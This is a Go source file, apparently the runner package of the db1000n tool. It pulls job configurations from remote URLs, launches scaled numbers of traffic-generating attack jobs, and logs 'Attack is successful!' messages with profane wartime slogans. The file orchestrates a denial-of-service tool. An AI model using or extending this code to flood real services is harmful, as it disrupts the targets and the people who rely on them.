// Package runner [responsible for updating the config and managing jobs accordingly]
package runner

import (
	"context"
	"log"
	"strings"
	"time"

	"github.com/google/uuid"

	"github.com/Arriven/db1000n/src/jobs"
	"github.com/Arriven/db1000n/src/runner/config"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/metrics"
	"github.com/Arriven/db1000n/src/utils/templates"
)

// Config for the job runner
type Config struct {
	ConfigPaths    string            // Comma-separated config location URLs
	BackupConfig   []byte            // Raw backup config
	RefreshTimeout time.Duration     // How often to refresh config
	Format         string            // json or yaml
	Global         jobs.GlobalConfig // meant to pass cmdline and other args to every job
}

// Runner executes jobs according to the (fetched from remote) configuration
type Runner struct {
	config         *Config
	configPaths    []string
	backupConfig   []byte
	refreshTimeout time.Duration
	configFormat   string

	currentRawConfig []byte // currently applied config

	debug bool
}

// New runner according to the config
func New(cfg *Config, debug bool) (*Runner, error) {
	return &Runner{
		config:         cfg,
		configPaths:    strings.Split(cfg.ConfigPaths, ","),
		backupConfig:   cfg.BackupConfig,
		refreshTimeout: cfg.RefreshTimeout,
		configFormat:   cfg.Format,

		debug: debug,
	}, nil
}

// Run the runner and block until Stop() is called
func (r *Runner) Run(ctx context.Context) {
	clientID := uuid.New()
	refreshTimer := time.NewTicker(r.refreshTimeout)
	defer refreshTimer.Stop()

	var cancel context.CancelFunc
	for {
		if cfg, raw := config.Update(r.configPaths, r.currentRawConfig, r.backupConfig, r.configFormat); cfg != nil {
			if cancel != nil {
				cancel()
			}

			cancel = r.runJobs(ctx, cfg, clientID)

			r.currentRawConfig = raw
		}

		// Wait for refresh timer or stop signal
		select {
		case <-refreshTimer.C:
		case <-ctx.Done():
			if cancel != nil {
				cancel()
			}
			return
		}

		dumpMetrics(clientID.String(), r.debug)
	}
}

func (r *Runner) runJobs(ctx context.Context, cfg *config.Config, clientID uuid.UUID) (cancel context.CancelFunc) {
	ctx, cancel = context.WithCancel(ctx)

	var jobInstancesCount int

	for i := range cfg.Jobs {
		if len(cfg.Jobs[i].Filter) != 0 && strings.TrimSpace(templates.ParseAndExecute(cfg.Jobs[i].Filter, clientID.ID())) != "true" {
			log.Println("There is a filter defined for a job but this client doesn't pass it - skip the job")
			continue
		}

		job := jobs.Get(cfg.Jobs[i].Type)
		if job == nil {
			log.Printf("Unknown job %q", cfg.Jobs[i].Type)

			continue
		}

		if cfg.Jobs[i].Count < 1 {
			cfg.Jobs[i].Count = 1
		}

		if r.config.Global.ScaleFactor > 0 {
			cfg.Jobs[i].Count *= r.config.Global.ScaleFactor
		}

		cfgMap := make(map[string]interface{})
		if err := utils.Decode(cfg.Jobs[i], &cfgMap); err != nil {
			log.Fatal("failed to encode cfg map")
		}

		ctx := context.WithValue(ctx, templates.ContextKey("config"), cfgMap)

		for j := 0; j < cfg.Jobs[i].Count; j++ {
			go func(i int) {
				_, err := job(ctx, r.config.Global, cfg.Jobs[i].Args, r.debug)
				if err != nil {
					log.Println("error running job:", err)
				}
			}(i)

			jobInstancesCount++
		}
	}

	log.Printf("%d job instances (re)started", jobInstancesCount)
	return cancel
}

func dumpMetrics(clientID string, debug bool) {
	defer func() {
		if err := recover(); err != nil {
			log.Printf("caught panic: %v", err)
		}
	}()

	bytesGenerated := metrics.Default.Read(metrics.Traffic)
	bytesProcessed := metrics.Default.Read(metrics.ProcessedTraffic)
	err := utils.ReportStatistics(int64(bytesGenerated), clientID)
	if err != nil && debug {
		log.Println("error reporting statistics:", err)
	}
	if bytesGenerated > 0 {
		log.Println("Атака проводиться успішно! Руський воєнний корабль іди нахуй!")
		log.Println("Attack is successful! Russian warship, go fuck yourself!")
		log.Printf("The app has generated approximately %v bytes of traffic\n", bytesGenerated)
		if bytesProcessed > 0 {
			log.Printf("Of which for %v bytes we received some response from the target", bytesProcessed)
		}
	} else {
		log.Println("The app doesn't seem to generate any traffic, please contact your admin")
	}
}
